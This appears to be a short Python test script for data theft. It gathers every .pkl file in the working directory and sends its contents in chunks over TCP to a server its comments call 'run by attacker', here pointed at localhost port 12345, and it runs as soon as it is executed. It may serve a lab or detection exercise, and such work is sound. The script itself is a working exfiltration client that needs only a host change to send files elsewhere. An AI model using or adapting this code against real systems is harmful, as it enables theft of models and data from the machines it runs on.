#used for testing

import socket
import os

HOST = 'localhost'
PORT = 12345
CHUNK = 4096

def start():

    #list all files in local directory
    local_files = os.listdir()

    #create a client socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        try:
            #connect to server run by attacker
            client_socket.connect((HOST,PORT))

            #check each file, only open and send data if file is a .pkl file
            for file in local_files:
                if (file.endswith(".pkl")):
                    with open(file, "rb") as f:
                        #read and send file data in chunks
                        while True:
                            data = f.read(CHUNK)

                            client_socket.send(data) #no need to encode, since data is already a bytestring

                            response = client_socket.recv(1024).decode() #expect acknowledgement from server
                            #print(f"server response: {response}")
                            #stop reading if size of data is less than chunk size (eof reached)
                            if (len(data) < CHUNK):
                                print("eof")
                                break

        except Exception as e:
            print("Error:", e)
        
start()